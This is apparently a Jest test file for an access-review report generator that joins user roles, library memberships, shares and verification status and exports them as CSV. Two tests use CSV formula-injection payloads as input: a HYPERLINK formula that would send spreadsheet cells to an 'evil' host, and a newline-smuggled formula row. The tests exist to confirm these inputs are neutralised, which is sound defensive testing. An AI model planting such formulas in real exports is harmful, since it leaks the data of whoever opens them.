'use strict';
// Covers the access-review assembler: role/name join, explicit vs open library
// access, admin "all", direct-share counts, last-activity, and CSV shaping.
jest.mock('../../lib/db', () => ({ query: jest.fn() }));
const { assemble, toCsv } = require('../../lib/accessReview');

const NOW = new Date('2026-07-11T12:00:00.000Z');

const DATA = {
  roles: [
    { user_id: 'u1', email: 'dave@x.com', role: 'admin', assigned_at: '2026-01-01T00:00:00Z' },
    { user_id: 'u2', email: 'ann@x.com', role: 'contributor', assigned_at: '2026-02-01T00:00:00Z' },
    { user_id: 'u3', email: 'val@x.com', role: 'viewer', assigned_at: '2026-03-01T00:00:00Z' },
  ],
  profiles: [{ email: 'ann@x.com', display_name: 'Ann Smith' }],
  libraries: [{ id: 'L1', name: 'Clients' }, { id: 'L2', name: 'Ops' }, { id: 'L3', name: 'Public' }],
  // L1 + L2 have members; L3 has none → open.
  memberships: [
    { subject_email: 'ann@x.com', library_id: 'L1' },
    { subject_email: 'ann@x.com', library_id: 'L2' },
    { subject_email: 'val@x.com', library_id: 'L1' },
  ],
  lastActivity: [{ user_email: 'ann@x.com', last: '2026-07-10T09:00:00Z' }],
  shares: [{ subject_email: 'val@x.com', n: '4' }],
};

describe('assemble', () => {
  const r = assemble(DATA, NOW);

  test('reports generation time, count, and open libraries', () => {
    expect(r.generatedAt).toBe('2026-07-11T12:00:00.000Z');
    expect(r.userCount).toBe(3);
    expect(r.openLibraries).toEqual(['Public']); // L3 has no members
  });

  test('admin shows "all (admin)", not enumerated libraries', () => {
    const dave = r.users.find(u => u.email === 'dave@x.com');
    expect(dave.libraries).toEqual(['all (admin)']);
  });

  test('non-admin lists explicit memberships (sorted), joined by name/profile', () => {
    const ann = r.users.find(u => u.email === 'ann@x.com');
    expect(ann.name).toBe('Ann Smith');
    expect(ann.role).toBe('contributor');
    expect(ann.libraries).toEqual(['Clients', 'Ops']);
    expect(ann.lastActivity).toBe('2026-07-10T09:00:00Z');
    expect(ann.directShares).toBe(0);
  });

  test('direct-share count and never-active are represented', () => {
    const val = r.users.find(u => u.email === 'val@x.com');
    expect(val.directShares).toBe(4);
    expect(val.libraries).toEqual(['Clients']);
    expect(val.lastActivity).toBeNull();
  });
});

describe('toCsv', () => {
  test('emits a header comment, open-libraries note, and one row per user', () => {
    const csv = toCsv(assemble(DATA, NOW));
    const lines = csv.split('\n');
    expect(lines[0]).toContain('Memex access review');
    expect(lines[1]).toContain('Listed to every signed-in user (no file access)');
    expect(lines[2]).toBe('email,name,role,role_assigned,email_verified,owns,library_access,folder_access,groups,listed_in,direct_shares,last_activity');
    expect(csv).toContain('ann@x.com,Ann Smith,contributor');
    // libraries joined with "; " must be quoted because of the comma-free but semicolon list
    expect(csv).toMatch(/Clients; Ops/);
    expect(lines.filter(l => l && !l.startsWith('#') && !l.startsWith('email,'))).toHaveLength(3);
  });

  test('neutralizes spreadsheet formula injection in a user-controlled name', () => {
    const data = {
      ...DATA,
      profiles: [{ email: 'ann@x.com', display_name: '=HYPERLINK("http://evil/?"&CONCAT(A1:G1),"x")' }],
    };
    const csv = toCsv(assemble(data, NOW));
    // the dangerous cell must be prefixed with an apostrophe and quoted, never emitted as a bare =formula
    expect(csv).toContain('"\'=HYPERLINK');
    expect(csv).not.toMatch(/,=HYPERLINK/);
  });

  test('a newline-bearing open-library name cannot split the header into a formula row', () => {
    // A contributor-created library (no members => "open") with an embedded newline.
    const data = { ...DATA, libraries: [
      { id: 'L1', name: 'Clients' }, { id: 'L2', name: 'Ops' },
      { id: 'L3', name: 'Public\n=HYPERLINK("http://evil","x")' },
    ] };
    const csv = toCsv(assemble(data, NOW));
    // The whole "# Listed to every signed-in user" header must be quoted, so the newline
    // stays inside one CSV field instead of starting a new physical =formula row.
    expect(csv).toContain('"# Listed to every signed-in user');
  });

  test('role_assigned is ISO even when Postgres returns a Date object', () => {
    const data = { ...DATA, roles: [{ user_id: 'u1', email: 'dave@x.com', role: 'admin', assigned_at: new Date('2026-02-01T00:00:00.000Z') }] };
    const csv = toCsv(assemble(data, NOW));
    expect(csv).toContain('2026-02-01T00:00:00.000Z');
    expect(csv).not.toMatch(/GMT|Pacific|Daylight/); // never a locale toString()
  });
});

// Shares: what each person reaches, and why. Only a verified address matches a share.
describe('shares in the review', () => {
  const SHARED = {
    ...DATA,
    roles: [
      ...DATA.roles.map(r => ({ ...r, verified_email: r.email })),
      { user_id: 'u4', email: 'claims@x.com', role: 'contributor', assigned_at: null, verified_email: null },
    ],
    libraries: [{ id: 'L1', name: 'Clients', owner_id: 'u2' }, { id: 'L2', name: 'Ops' }, { id: 'L3', name: 'Public' }, { id: 'L4', name: 'Shared, no members' }],
    groups: [{ id: 'G1', name: 'Acctg' }],
    groupMembers: [{ group_id: 'G1', email: 'val@x.com' }, { group_id: 'G1', email: 'new@outside.com' }, { group_id: 'G1', email: 'claims@x.com' }],
    grants: [
      { library_id: 'L4', folder_path: '', subject_type: 'user', subject_email: 'ann@x.com', permission: 'write' },
      { library_id: 'L1', folder_path: 'Mender', subject_type: 'group', group_id: 'G1', permission: 'write' },
      { library_id: 'L4', folder_path: '', subject_type: 'user', subject_email: 'client@outside.com', permission: 'read' },
    ],
  };
  const r = assemble(SHARED, NOW);
  const user = (e) => r.users.find(u => u.email === e);

  test('owners, direct library shares and group folder shares are named with their level and source', () => {
    expect(user('ann@x.com').owns).toEqual(['Clients']);
    expect(user('ann@x.com').libraryAccess).toEqual(['Shared, no members (Read-Write, direct)']);
    expect(user('val@x.com').groups).toEqual(['Acctg']);
  });

  test('a viewer is shown at Read-only, whatever the share says', () => {
    expect(user('val@x.com').folderAccess).toEqual(['Clients / Mender (Read-only, via group "Acctg")']);
  });

  test('an account without a verified address is flagged and gets nothing through shares', () => {
    const c = user('claims@x.com');
    expect(c.emailVerified).toBe(false);
    expect(c.folderAccess).toEqual([]);
    expect(c.groups).toEqual([]);
  });

  test('addresses holding shares with no verified account yet are listed separately', () => {
    expect(r.pendingShares.map(p => p.email)).toEqual(['claims@x.com', 'client@outside.com', 'new@outside.com']);
    expect(r.pendingShares.find(p => p.email === 'client@outside.com').libraryAccess).toEqual(['Shared, no members (Read-only, direct)']);
    expect(r.pendingShares.find(p => p.email === 'new@outside.com').folderAccess).toEqual(['Clients / Mender (Read-Write, via group "Acctg")']);
  });

  test('a shared library is no longer "listed to everyone"', () => {
    expect(r.openLibraries).toEqual(['Public']);
  });

  test('the CSV carries every new column, and the pending addresses as rows', () => {
    const csv = toCsv(r);
    expect(csv).toMatch(/^ann@x\.com,Ann Smith,contributor,[^,]*,yes,Clients,"?Shared, no members \(Read-Write, direct\)"?/m);
    expect(csv).toMatch(/^new@outside\.com,,no account yet,,no,,,/m);
  });
});
